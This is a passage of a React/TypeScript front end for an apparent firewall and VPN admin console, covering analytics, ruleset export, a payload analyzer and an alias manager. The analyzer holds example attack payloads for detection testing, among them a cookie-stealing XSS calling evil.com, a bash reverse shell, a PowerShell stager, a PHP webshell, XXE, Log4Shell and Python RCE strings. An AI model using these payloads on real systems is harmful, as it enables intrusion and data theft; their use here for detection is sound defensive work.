// ── Analytics ─────────────────────────────────────────────────────────────
function AnalyticsTab() {
  const { data } = useGetFirewallAnalytics();
  const mx = Math.max(...(data?.topBlockedIps??[]).map((b:{hits?:number})=>b.hits??0),1);
  const tl = data?.threatLevel??"safe";
  const tlC = tl==="critical"?"#ff2244":tl==="high"?"#ff6600":tl==="medium"?"#ffaa00":tl==="low"?"#aaccff":"#00ff88";
  return (
    <div style={{ display:"flex", flexDirection:"column", gap:14 }}>
      <div style={{ display:"grid", gridTemplateColumns:"repeat(4,1fr)", gap:12 }}>
        {[{l:"Threat Level",v:tl.toUpperCase(),c:tlC},{l:"Total Blocked",v:(data?.totalBlocked24h??0).toLocaleString(),c:"#ff4444"},{l:"IPS Hits",v:(data?.totalIpsHits24h??0).toLocaleString(),c:"#ff9900"},{l:"DPI Hits",v:(data?.totalDpiHits24h??0).toLocaleString(),c:"#44aaff"}].map(s=>(
          <div key={s.l} style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:16, textAlign:"center" }}>
            <div style={{ fontSize:24, fontWeight:900, color:s.c, fontFamily:"monospace" }}>{s.v}</div>
            <div style={{ fontSize:10, color:"#444", marginTop:4 }}>{s.l}</div>
          </div>
        ))}
      </div>
      <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14 }}>
          <div style={{ fontSize:11, color:"#ff4444", fontWeight:700, marginBottom:12 }}>Top Blocked IPs</div>
          {(data?.topBlockedIps??[]).length===0?<div style={{color:"#333",fontSize:11}}>No blocks yet</div>:(data?.topBlockedIps??[]).map((b:{ip?:string;hits?:number;reason?:string},i:number)=>(
            <div key={i} style={{ marginBottom:10 }}>
              <div style={{ display:"flex", justifyContent:"space-between", fontSize:11, marginBottom:3 }}>
                <span style={{ fontFamily:"monospace", color:"#ff4444" }}>{b.ip}</span>
                <span style={{ color:"#ff9900", fontFamily:"monospace" }}>{b.hits}</span>
              </div>
              <div style={{ height:3, background:"#1a1a1a", borderRadius:2 }}>
                <div style={{ height:"100%", background:"#ff4444", borderRadius:2, width:`${((b.hits??0)/mx)*100}%` }}/>
              </div>
            </div>
          ))}
        </div>
        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14 }}>
          <div style={{ fontSize:11, color:"#ff9900", fontWeight:700, marginBottom:12 }}>IPS Category Breakdown</div>
          {(data?.ipsCategoryBreakdown??[]).map((cat:{category?:string;total?:number;enabled?:number;hits?:number})=>(
            <div key={cat.category} style={{ marginBottom:10 }}>
              <div style={{ display:"flex", justifyContent:"space-between", fontSize:11, marginBottom:3 }}>
                <span style={{ fontFamily:"monospace", textTransform:"uppercase", fontSize:10 }}>{cat.category}</span>
                <div style={{ display:"flex", gap:8 }}><span style={{ color:"#444", fontSize:9 }}>{cat.enabled}/{cat.total}</span><span style={{ color:"#ff9900", fontFamily:"monospace" }}>{cat.hits}</span></div>
              </div>
              <div style={{ height:3, background:"#1a1a1a", borderRadius:2 }}>
                <div style={{ height:"100%", background:"#ff9900", borderRadius:2, width:`${((cat.enabled??0)/Math.max(cat.total??1,1))*100}%` }}/>
              </div>
            </div>
          ))}
        </div>
      </div>
      <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14 }}>
        <div style={{ fontSize:11, color:"#cc44ff", fontWeight:700, marginBottom:10 }}>GhostOS™ Top Triggered Rules</div>
        {(data?.topGhostOsRules??[]).length===0?<div style={{color:"#333",fontSize:11}}>No GhostOS™ rule triggers yet</div>:(data?.topGhostOsRules??[]).map((r:{rule?:string;hits?:number;description?:string},i:number)=>(
          <div key={i} style={{ display:"flex", alignItems:"center", gap:12, background:"#111", borderRadius:6, padding:"7px 12px", marginBottom:6 }}>
            <span style={{ fontFamily:"monospace", fontSize:12, color:"#cc44ff" }}>{r.rule}</span>
            <span style={{ fontSize:10, color:"#444", flex:1 }}>{r.description}</span>
            <span style={{ fontFamily:"monospace", color:"#ff9900", fontSize:11 }}>{r.hits} hits</span>
          </div>
        ))}
      </div>
    </div>
  );
}

// ── Export ────────────────────────────────────────────────────────────────
function ExportTab() {
  const { mutate: gen, data, isPending } = useGenerateIptablesRules();
  const [copied, setCopied] = useState<string|null>(null);
  const copy = (k:string,t:string)=>{ navigator.clipboard.writeText(t); setCopied(k); setTimeout(()=>setCopied(null),1500); };
  const dl = (fn:string,c:string)=>{ const a=document.createElement("a"); a.href=URL.createObjectURL(new Blob([c],{type:"text/plain"})); a.download=fn; a.click(); };
  const d = data as Record<string,string>|undefined;
  return (
    <div style={{ display:"flex", flexDirection:"column", gap:14 }}>
      <div style={{ display:"flex", alignItems:"center", gap:12 }}>
        <button onClick={()=>gen()} disabled={isPending} style={{ background:"#00ff8822", border:"1px solid #00ff8844", color:"#00ff88", borderRadius:8, padding:"10px 20px", cursor:"pointer", fontSize:12, fontFamily:"monospace", display:"flex", alignItems:"center", gap:8 }}>
          <RefreshCw size={13}/>{isPending?"Generating...":"Generate All Rulesets"}
        </button>
        <span style={{ fontSize:11, color:"#444" }}>Compiles GhostOS™ SymScript™ + standard rules → iptables, nftables, WireGuard, pfSense</span>
      </div>
      {d&&(
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:12 }}>
          {[
            {k:"iptables",l:"iptables-save Format",c:d.iptablesRules,color:"#00ff88",fn:"proxhqvpn-firewall.iptables"},
            {k:"nftables",l:"nftables Format",c:d.nftablesRules,color:"#44aaff",fn:"proxhqvpn-firewall.nft"},
            {k:"wg",l:"WireGuard Masquerade",c:d.wireguardMasquerade,color:"#cc44ff",fn:"wg-masquerade.sh"},
            {k:"ghost",l:"GhostOS™ SymScript™",c:d.ghostOsSymscript,color:"#ff9900",fn:"proxhqos-rules.symscript"},
          ].map(s=>(
            <div key={s.k} style={{ background:"#0a0a0a", border:`1px solid ${s.color}22`, borderRadius:8, overflow:"hidden" }}>
              <div style={{ padding:"10px 14px", borderBottom:"1px solid #1a1a1a", display:"flex", alignItems:"center", justifyContent:"space-between" }}>
                <span style={{ fontSize:11, color:s.color, fontFamily:"monospace", fontWeight:700 }}>{s.l}</span>
                <div style={{ display:"flex", gap:6 }}>
                  <button onClick={()=>copy(s.k,s.c??"")} style={{ background:"none", border:"1px solid #222", borderRadius:3, padding:"2px 7px", cursor:"pointer", color:copied===s.k?"#00ff88":"#444", fontSize:10 }}>{copied===s.k?<Check size={9}/>:<Copy size={9}/>}</button>
                  <button onClick={()=>dl(s.fn,s.c??"")} style={{ background:"none", border:"1px solid #222", borderRadius:3, padding:"2px 7px", cursor:"pointer", color:"#444", fontSize:10 }}><Download size={9}/></button>
                </div>
              </div>
              <pre style={{ padding:12, fontSize:10, color:"#555", fontFamily:"monospace", maxHeight:180, overflow:"auto", margin:0, whiteSpace:"pre-wrap" }}>
                {(s.c??"").substring(0,1200)}{(s.c??"").length>1200?"\n...":""}
              </pre>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

// ══════════════════════════════════════════════════════════════════════════════
// ── Payload Code Analyzer Tab ─────────────────────────────────────────────────
// ══════════════════════════════════════════════════════════════════════════════

interface FlaggedToken { line: number; col: number; token: string; reason: string; severity: string; score: number }
interface ObfFlag     { type: string; detail: string; score: number }
interface StructFlag  { type: string; detail: string; score: number }
interface WAFMatch    { name: string; attackType: string; severity: string; pattern: string }
interface AnalysisResult {
  verdict:          "malicious" | "suspicious" | "clean";
  confidence:       number;
  anomalyScore:     number;
  detectedLanguage: string;
  entropy:          number;
  threatCategories: string[];
  recommendation:   string;
  flaggedTokens:    FlaggedToken[];
  obfuscationFlags: ObfFlag[];
  structuralFlags:  StructFlag[];
  wafRuleMatches:   WAFMatch[];
  summary:          { tokenHits: number; obfuscation: number; structural: number; wafMatches: number };
}

const EXAMPLE_PAYLOADS: Record<string, { label: string; code: string }> = {
  sqli:   { label: "SQL Injection",    code: "' UNION SELECT username, password FROM users WHERE '1'='1'; -- " },
  xss:    { label: "XSS Payload",      code: '<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">' },
  shell:  { label: "Bash Reverse Shell", code: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" },
  ps:     { label: "PowerShell Stager", code: "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMAV" },
  php:    { label: "PHP Webshell",     code: '<?php system($_GET["cmd"]); ?>' },
  xxe:    { label: "XXE Injection",    code: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' },
  log4:   { label: "Log4Shell",        code: '${jndi:ldap://evil.com:1234/a}' },
  python: { label: "Python RCE",       code: "__import__('os').system('id; cat /etc/passwd')" },
  proto:  { label: "Prototype Pollution", code: '{"__proto__": {"isAdmin": true, "role": "superuser"}}' },
};

const VERDICT_STYLE: Record<string, { bg: string; border: string; text: string; glow: string }> = {
  malicious:  { bg: "#1a0005", border: "#ff2244", text: "#ff4466", glow: "#ff224440" },
  suspicious: { bg: "#1a0e00", border: "#ff8800", text: "#ffaa33", glow: "#ff880040" },
  clean:      { bg: "#001a0a", border: "#00cc55", text: "#00ff88", glow: "#00cc5540" },
};
const SEV_C: Record<string,string> = { critical:"#ff2244", high:"#ff6600", medium:"#ffaa00", low:"#aaccff" };

function TokenRow({ t, idx }: { t: FlaggedToken; idx: number }) {
  const [exp, setExp] = useState(false);
  const c = SEV_C[t.severity] ?? "#888";
  return (
    <div style={{ borderBottom:"1px solid #111", padding:"6px 0" }}>
      <div style={{ display:"flex", alignItems:"center", gap:8, cursor:"pointer" }} onClick={() => setExp(e => !e)}>
        {exp ? <ChevronDown size={10} color="#555"/> : <ChevronRight size={10} color="#555"/>}
        <span style={{ color:c, fontFamily:"monospace", fontSize:10, fontWeight:700, letterSpacing:1, minWidth:70, textTransform:"uppercase" }}>{t.severity}</span>
        <code style={{ color:"#ff9933", fontSize:10, background:"#1a0f00", padding:"1px 5px", borderRadius:3, maxWidth:220, overflow:"hidden", textOverflow:"ellipsis", whiteSpace:"nowrap" }}>{t.token}</code>
        <span style={{ color:"#555", fontSize:9 }}>L{t.line}:{t.col}</span>
        <span style={{ marginLeft:"auto", color:"#ff6600", fontSize:9, fontFamily:"monospace" }}>+{t.score}</span>
      </div>
      {exp && (
        <div style={{ paddingLeft:24, marginTop:4, color:"#777", fontSize:10, lineHeight:1.5 }}>
          {t.reason}
        </div>
      )}
    </div>
  );
}

function FlagSection({ title, items, color }: { title: string; items: Array<{ type: string; detail: string; score: number }>; color: string }) {
  if (!items.length) return null;
  return (
    <div style={{ background:"#0a0a0a", border:`1px solid ${color}33`, borderRadius:8, padding:14, marginBottom:12 }}>
      <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color, marginBottom:8 }}>{title}</div>
      {items.map((f, i) => (
        <div key={i} style={{ display:"flex", gap:8, padding:"5px 0", borderBottom: i < items.length-1 ? "1px solid #111" : "none" }}>
          <code style={{ color:"#888", fontSize:9, background:"#111", padding:"1px 5px", borderRadius:3, flexShrink:0 }}>{f.type}</code>
          <span style={{ color:"#aaa", fontSize:10, flex:1 }}>{f.detail}</span>
          <span style={{ color, fontSize:9, fontFamily:"monospace", flexShrink:0 }}>+{f.score}</span>
        </div>
      ))}
    </div>
  );
}

function PayloadAnalyzerTab() {
  const [code, setCode]           = useState("");
  const [language, setLanguage]   = useState("auto");
  const [context, setContext]     = useState("http_body");
  const [result, setResult]       = useState<AnalysisResult | null>(null);
  const [loading, setLoading]     = useState(false);
  const [error, setError]         = useState<string | null>(null);
  const [showRaw, setShowRaw]     = useState(false);
  const textareaRef               = useRef<HTMLTextAreaElement>(null);

  const analyze = useCallback(async () => {
    if (!code.trim()) return;
    setLoading(true);
    setError(null);
    setResult(null);
    try {
      const res = await fetch("/api/waf/analyze-code", {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({
          code,
          language: language === "auto" ? undefined : language,
          context,
          sourceIp: "admin-console",
        }),
      });
      if (!res.ok) { setError(`Server error: ${res.status}`); return; }
      setResult(await res.json() as AnalysisResult);
    } catch (e) {
      setError(String(e));
    } finally {
      setLoading(false);
    }
  }, [code, language, context]);

  const loadExample = useCallback((key: string) => {
    const ex = EXAMPLE_PAYLOADS[key];
    if (ex) { setCode(ex.code); setResult(null); }
  }, []);

  const vs   = result ? VERDICT_STYLE[result.verdict]! : null;
  const conf = result?.confidence ?? 0;

  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:16, alignItems:"start" }}>

      {/* ── Left: Editor Panel ── */}
      <div>
        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:16, marginBottom:12 }}>
          <div style={{ display:"flex", alignItems:"center", gap:8, marginBottom:12 }}>
            <FlaskConical size={14} color="#00ff88"/>
            <span style={{ fontFamily:"monospace", fontWeight:800, fontSize:13, color:"#fff" }}>Payload Code Analyzer</span>
            <span style={{ fontSize:9, color:"#333", marginLeft:"auto" }}>Multi-layer: tokenization · entropy · structural · WAF</span>
          </div>

          {/* Controls */}
          <div style={{ display:"flex", gap:8, marginBottom:10, flexWrap:"wrap" }}>
            <select value={language} onChange={e => setLanguage(e.target.value)}
              style={{ background:"#111", border:"1px solid #222", color:"#ccc", borderRadius:4, padding:"4px 8px", fontSize:10, fontFamily:"monospace" }}>
              {["auto","sql","javascript","python","shell","powershell","php","xml","html","json"].map(l =>
                <option key={l} value={l}>{l === "auto" ? "Auto-detect language" : l.toUpperCase()}</option>
              )}
            </select>
            <select value={context} onChange={e => setContext(e.target.value)}
              style={{ background:"#111", border:"1px solid #222", color:"#ccc", borderRadius:4, padding:"4px 8px", fontSize:10, fontFamily:"monospace" }}>
              {["http_body","form_field","url_param","header","file_upload","cookie"].map(c =>
                <option key={c} value={c}>{c.replace(/_/g," ")}</option>
              )}
            </select>
          </div>

          {/* Code textarea */}
          <textarea
            ref={textareaRef}
            value={code}
            onChange={e => { setCode(e.target.value); setResult(null); }}
            placeholder="Paste any code, payload, or HTTP body here for deep malicious-code analysis…&#10;&#10;Examples: SQL injection, XSS, shell commands, PowerShell, PHP, XML/XXE, Python, Log4Shell"
            style={{ width:"100%", minHeight:240, background:"#050505", border:"1px solid #1a1a1a", color:"#00ff88", fontFamily:"'Courier New',monospace", fontSize:11, padding:12, borderRadius:6, resize:"vertical", outline:"none", boxSizing:"border-box", lineHeight:1.6 }}
          />

          <div style={{ display:"flex", gap:8, marginTop:10, alignItems:"center" }}>
            <button onClick={analyze} disabled={loading || !code.trim()}
              style={{ background: loading ? "#111" : "#00ff88", color:"#000", border:"none", borderRadius:6, padding:"8px 20px", fontFamily:"monospace", fontWeight:800, fontSize:12, cursor: loading ? "not-allowed" : "pointer", opacity: !code.trim() ? 0.4 : 1 }}>
              {loading ? "⟳ Analyzing…" : "🔬 Analyze Payload"}
            </button>
            <button onClick={() => { setCode(""); setResult(null); setError(null); }}
              style={{ background:"none", border:"1px solid #222", color:"#555", borderRadius:6, padding:"8px 14px", fontSize:11, cursor:"pointer" }}>
              Clear
            </button>
            {result && (
              <button onClick={() => setShowRaw(r => !r)}
                style={{ background:"none", border:"1px solid #222", color:"#555", borderRadius:6, padding:"8px 14px", fontSize:11, cursor:"pointer", marginLeft:"auto" }}>
                {showRaw ? "Hide Raw" : "Raw JSON"}
              </button>
            )}
          </div>

          {error && <div style={{ marginTop:10, color:"#ff4466", fontSize:11, fontFamily:"monospace" }}>⚠ {error}</div>}
        </div>

        {/* Example payloads */}
        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14 }}>
          <div style={{ fontFamily:"monospace", fontSize:10, color:"#444", marginBottom:8 }}>EXAMPLE PAYLOADS</div>
          <div style={{ display:"flex", flexWrap:"wrap", gap:6 }}>
            {Object.entries(EXAMPLE_PAYLOADS).map(([k, v]) => (
              <button key={k} onClick={() => loadExample(k)}
                style={{ background:"#111", border:"1px solid #222", color:"#888", borderRadius:4, padding:"4px 10px", fontSize:10, fontFamily:"monospace", cursor:"pointer" }}>
                {v.label}
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* ── Right: Results Panel ── */}
      <div>
        {!result && !loading && (
          <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:40, textAlign:"center" }}>
            <FlaskConical size={32} color="#1a1a1a" style={{ marginBottom:12 }}/>
            <p style={{ color:"#333", fontFamily:"monospace", fontSize:12 }}>Paste a payload and click Analyze to run the multi-layer inspection engine</p>
            <p style={{ color:"#222", fontSize:10, marginTop:8 }}>Detection layers: token scanning · obfuscation · structural analysis · 100+ WAF rules · Shannon entropy</p>
          </div>
        )}

        {loading && (
          <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:40, textAlign:"center" }}>
            <div style={{ fontSize:24, marginBottom:12, animation:"spin 1s linear infinite" }}>⟳</div>
            <p style={{ color:"#555", fontFamily:"monospace", fontSize:12 }}>Running detection layers…</p>
          </div>
        )}

        {result && vs && (
          <div>
            {/* Verdict card */}
            <div style={{ background: vs.bg, border:`2px solid ${vs.border}`, borderRadius:10, padding:18, marginBottom:12, boxShadow:`0 0 20px ${vs.glow}` }}>
              <div style={{ display:"flex", alignItems:"center", justifyContent:"space-between", marginBottom:12 }}>
                <div>
                  <div style={{ fontFamily:"monospace", fontSize:22, fontWeight:900, color: vs.text, letterSpacing:2, textTransform:"uppercase" }}>
                    {result.verdict === "malicious" ? "⛔ MALICIOUS" : result.verdict === "suspicious" ? "⚠ SUSPICIOUS" : "✓ CLEAN"}
                  </div>
                  <div style={{ color:"#555", fontSize:10, fontFamily:"monospace", marginTop:2 }}>
                    Language: <span style={{ color:"#888" }}>{result.detectedLanguage.toUpperCase()}</span> · Entropy: <span style={{ color:"#888" }}>{result.entropy}</span>
                  </div>
                </div>
                <div style={{ textAlign:"right" }}>
                  <div style={{ fontSize:28, fontWeight:900, fontFamily:"monospace", color: vs.text }}>{result.anomalyScore}</div>
                  <div style={{ fontSize:9, color:"#555", fontFamily:"monospace" }}>ANOMALY SCORE</div>
                </div>
              </div>

              {/* Confidence bar */}
              <div style={{ marginBottom:10 }}>
                <div style={{ display:"flex", justifyContent:"space-between", marginBottom:4 }}>
                  <span style={{ fontSize:9, color:"#555", fontFamily:"monospace" }}>CONFIDENCE</span>
                  <span style={{ fontSize:11, color: vs.text, fontFamily:"monospace", fontWeight:700 }}>{conf}%</span>
                </div>
                <div style={{ background:"#111", borderRadius:4, height:6, overflow:"hidden" }}>
                  <div style={{ width:`${conf}%`, height:"100%", background: vs.border, borderRadius:4, transition:"width 0.6s ease" }}/>
                </div>
              </div>

              {/* Signal summary */}
              <div style={{ display:"flex", gap:8, flexWrap:"wrap" }}>
                {[
                  { label:"Token Hits",   val: result.summary.tokenHits,   color:"#ff6600" },
                  { label:"Obfuscation",  val: result.summary.obfuscation,  color:"#cc44ff" },
                  { label:"Structural",   val: result.summary.structural,   color:"#4488ff" },
                  { label:"WAF Matches",  val: result.summary.wafMatches,   color:"#ff2244" },
                ].map(s => (
                  <div key={s.label} style={{ background:"#0a0a0a", borderRadius:6, padding:"6px 10px", textAlign:"center", flex:1 }}>
                    <div style={{ fontSize:16, fontWeight:900, fontFamily:"monospace", color: s.val > 0 ? s.color : "#333" }}>{s.val}</div>
                    <div style={{ fontSize:8, color:"#444", textTransform:"uppercase", letterSpacing:1 }}>{s.label}</div>
                  </div>
                ))}
              </div>

              {/* Threat categories */}
              {result.threatCategories.length > 0 && (
                <div style={{ marginTop:10, display:"flex", flexWrap:"wrap", gap:4 }}>
                  {result.threatCategories.map(c => (
                    <span key={c} style={{ background:"#ff224422", color:"#ff4466", border:"1px solid #ff224444", borderRadius:3, padding:"2px 7px", fontSize:9, fontFamily:"monospace", textTransform:"uppercase" }}>{c.replace(/_/g," ")}</span>
                  ))}
                </div>
              )}
            </div>

            {/* Recommendation */}
            <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:12, marginBottom:12 }}>
              <div style={{ fontFamily:"monospace", fontSize:10, color:"#444", marginBottom:6 }}>RECOMMENDED ACTION</div>
              <p style={{ margin:0, fontSize:11, color: vs.text, fontFamily:"monospace", lineHeight:1.5 }}>{result.recommendation}</p>
            </div>

            {/* Flagged tokens */}
            {result.flaggedTokens.length > 0 && (
              <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14, marginBottom:12 }}>
                <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#ff6600", marginBottom:8 }}>
                  ⚡ Flagged Tokens ({result.flaggedTokens.length})
                </div>
                {result.flaggedTokens.map((t, i) => <TokenRow key={i} t={t} idx={i} />)}
              </div>
            )}

            <FlagSection title="🔐 Obfuscation Signals" items={result.obfuscationFlags} color="#cc44ff" />
            <FlagSection title="🏗 Structural / Behavioral" items={result.structuralFlags} color="#4488ff" />

            {/* WAF rule matches */}
            {result.wafRuleMatches.length > 0 && (
              <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14, marginBottom:12 }}>
                <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#ff2244", marginBottom:8 }}>
                  🛡 WAF Rule Matches ({result.wafRuleMatches.length})
                </div>
                {result.wafRuleMatches.map((w, i) => (
                  <div key={i} style={{ display:"flex", gap:8, padding:"5px 0", borderBottom: i < result.wafRuleMatches.length-1 ? "1px solid #111" : "none", alignItems:"center" }}>
                    <span style={{ color: SEV_C[w.severity] ?? "#888", fontSize:9, fontFamily:"monospace", fontWeight:700, minWidth:60, textTransform:"uppercase" }}>{w.severity}</span>
                    <span style={{ color:"#ccc", fontSize:10, flex:1 }}>{w.name}</span>
                    <span style={{ color:"#444", fontSize:9, background:"#111", padding:"1px 5px", borderRadius:3 }}>{w.attackType}</span>
                  </div>
                ))}
              </div>
            )}

            {/* Raw JSON */}
            {showRaw && (
              <div style={{ background:"#050505", border:"1px solid #1a1a1a", borderRadius:8, padding:14 }}>
                <div style={{ fontFamily:"monospace", fontSize:10, color:"#333", marginBottom:6 }}>RAW JSON RESPONSE</div>
                <pre style={{ margin:0, fontSize:9, color:"#555", overflowX:"auto", maxHeight:300 }}>{JSON.stringify(result, null, 2)}</pre>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// ── NEW GAP-FILLING TABS (pfSense / OPNsense / IPFire / Snort / Suricata) ────
// ─────────────────────────────────────────────────────────────────────────────

// Shared helpers
const API = "/api/fw";
async function fwPost(path: string, body: unknown) {
  const r = await fetch(`${API}${path}`, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body) });
  return r.json();
}
async function fwPut(path: string, body: unknown) {
  const r = await fetch(`${API}${path}`, { method:"PUT", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body) });
  return r.json();
}
async function fwDelete(path: string) {
  const r = await fetch(`${API}${path}`, { method:"DELETE" });
  return r.json();
}
function useFw<T>(path: string, dep?: unknown) {
  const [data, setData] = useState<T | null>(null);
  const [loading, setLoading] = useState(true);
  const load = useCallback(async () => {
    setLoading(true);
    try { const r = await fetch(`${API}${path}`); setData(await r.json()); } catch {}
    setLoading(false);
  }, [path]);
  useEffect(() => { void load(); }, [load, dep]);
  return { data, loading, reload: load };
}
function Spinner() { return <div style={{ color:"#444", fontFamily:"monospace", fontSize:11, padding:20 }}>Loading…</div>; }
function EmptyRow({ cols, msg }: { cols: number; msg: string }) {
  return <tr><td colSpan={cols} style={{ textAlign:"center", color:"#333", fontFamily:"monospace", fontSize:11, padding:20 }}>{msg}</td></tr>;
}
function TH({ children }: { children: React.ReactNode }) {
  return <th style={{ padding:"7px 10px", fontFamily:"monospace", fontSize:10, color:"#555", fontWeight:600, textAlign:"left", borderBottom:"1px solid #1a1a1a", whiteSpace:"nowrap" }}>{children}</th>;
}
function TD({ children, mono, c }: { children?: React.ReactNode; mono?: boolean; c?: string }) {
  return <td style={{ padding:"6px 10px", fontSize:11, color:c??"#ccc", fontFamily: mono?"monospace":"inherit", borderBottom:"1px solid #111" }}>{children}</td>;
}
function CardBox({ title, children, action }: { title: string; children: React.ReactNode; action?: React.ReactNode }) {
  return (
    <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:20, marginBottom:16 }}>
      <div style={{ display:"flex", alignItems:"center", justifyContent:"space-between", marginBottom:14 }}>
        <span style={{ fontFamily:"monospace", fontSize:12, fontWeight:700, color:"#fff" }}>{title}</span>
        {action}
      </div>
      {children}
    </div>
  );
}
function FwInput(props: React.InputHTMLAttributes<HTMLInputElement>) {
  return <input {...props} style={{ background:"#111", border:"1px solid #222", borderRadius:4, padding:"5px 10px", color:"#ccc", fontFamily:"monospace", fontSize:11, outline:"none", ...(props.style??{}) }} />;
}
function FwSelect(props: React.SelectHTMLAttributes<HTMLSelectElement> & { children: React.ReactNode }) {
  return <select {...props} style={{ background:"#111", border:"1px solid #222", borderRadius:4, padding:"5px 10px", color:"#ccc", fontFamily:"monospace", fontSize:11, outline:"none", ...(props.style??{}) }}>{props.children}</select>;
}
function Btn({ onClick, children, color, sm }: { onClick: () => void; children: React.ReactNode; color?: string; sm?: boolean }) {
  const bg = (color ?? "#00ff88") + "22";
  const bd = (color ?? "#00ff88") + "44";
  return (
    <button onClick={onClick} style={{ background:bg, border:`1px solid ${bd}`, color:color??"#00ff88", borderRadius:5, padding: sm?"3px 8px":"5px 12px", cursor:"pointer", fontFamily:"monospace", fontSize: sm?10:11 }}>
      {children}
    </button>
  );
}

// ── 1. ALIAS MANAGER ─────────────────────────────────────────────────────────
function AliasesTab() {
  const { data, loading, reload } = useFw<{ aliases: Array<{id:number;name:string;type:string;entries:string;description:string|null;hitCount:number;enabled:boolean}> }>("/aliases");
  const [form, setForm] = useState({ name:"", type:"host", entries:"", description:"" });
  const [saving, setSaving] = useState(false);

  const save = async () => {
    if (!form.name || !form.entries) return;
    setSaving(true);
    await fwPost("/aliases", form);
    setForm({ name:"", type:"host", entries:"", description:"" });
    await reload(); setSaving(false);
  };
  const seed = async () => { await fwPost("/aliases/seed", {}); await reload(); };

  const TYPE_COLOR: Record<string,string> = { host:"#00ff88", network:"#4488ff", port:"#ff9900", url_table:"#cc44ff", geo:"#ff4444" };

  return (
    <div>
      <CardBox title="🏷 Alias Manager — Named IP/Network/Port Groups (pfSense/OPNsense)" action={
        <div style={{ display:"flex", gap:8 }}>
          <Btn onClick={seed} color="#4488ff" sm>Seed Defaults</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{ margin:"0 0 14px", fontSize:11, color:"#555" }}>Create named reusable alias groups — host IPs, CIDRs, port ranges, or URL tables — that can be referenced by name in firewall rules instead of typing raw IPs every time. Identical to pfSense aliases.</p>
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr 1fr 2fr auto", gap:8, marginBottom:12 }}>
          <FwInput placeholder="Alias name (e.g. ADMIN_IPS)" value={form.name} onChange={e=>setForm(f=>({...f,name:e.target.value}))} />
          <FwSelect value={form.type} onChange={e=>setForm(f=>({...f,type:e.target.value}))}>
            <option value="host">Host (IPs)</option>
            <option value="network">Network (CIDRs)</option>
            <option value="port">Port / Range</option>
            <option value="url_table">URL Table</option>
            <option value="geo">GeoIP Country</option>
          </FwSelect>
          <FwInput placeholder="Description (optional)" value={form.description} onChange={e=>setForm(f=>({...f,description:e.target.value}))} />
          <FwInput placeholder="Entries (one per line: 192.168.1.0/24, :80, etc.)" value={form.entries} onChange={e=>setForm(f=>({...f,entries:e.target.value}))} />
          <Btn onClick={save} color="#00ff88">{saving?"Saving…":"+ Add"}</Btn>
        </div>
        {loading ? <Spinner/> : (
          <table style={{ width:"100%", borderCollapse:"collapse" }}>
            <thead><tr><TH>Name</TH><TH>Type</TH><TH>Entries</TH><TH>Description</TH><TH>Hits</TH><TH>Actions</TH></tr></thead>
            <tbody>
              {!data?.aliases?.length ? <EmptyRow cols={6} msg="No aliases defined. Click 'Seed Defaults' to pre-load useful groups."/> : data.aliases.map(a => (
                <tr key={a.id}>
                  <TD mono c="#00ff88">{a.name}</TD>
                  <TD><Bdg label={a.type} color={TYPE_COLOR[a.type]??"#888"} sm/></TD>
                  <TD mono c="#888">{a.entries.split("\n").slice(0,3).join(", ")}{a.entries.split("\n").length>3?` +${a.entries.split("\n").length-3} more`:""}</TD>
                  <TD c="#666">{a.description ?? "—"}</TD>
                  <TD mono c="#ff9900">{a.hitCount}</TD>
                  <td style={{ padding:"6px 10px", borderBottom:"1px solid #111" }}>
                    <div style={{ display:"flex", gap:4 }}>
                      <Btn onClick={async()=>{ await fwPost(`/aliases/${a.id}/resolve`,{}); await reload(); }} color="#4488ff" sm>Resolve</Btn>
                      <Btn onClick={async()=>{ await fwDelete(`/aliases/${a.id}`); await reload(); }} color="#ff4444" sm><Trash2 size={10}/></Btn>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </CardBox>
      <CardBox title="📘 How Aliases Work">
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr 1fr", gap:12 }}>
          {[
            { t:"Host Alias", d:"A list of individual IP addresses. Useful for admin workstations, trusted servers, or known-bad IPs. Example: 10.0.0.1, 10.0.0.2." },
            { t:"Network Alias", d:"One or more CIDR subnets. Example: 192.168.1.0/24, 10.8.0.0/16. Reference by name in source/dest fields of firewall rules." },
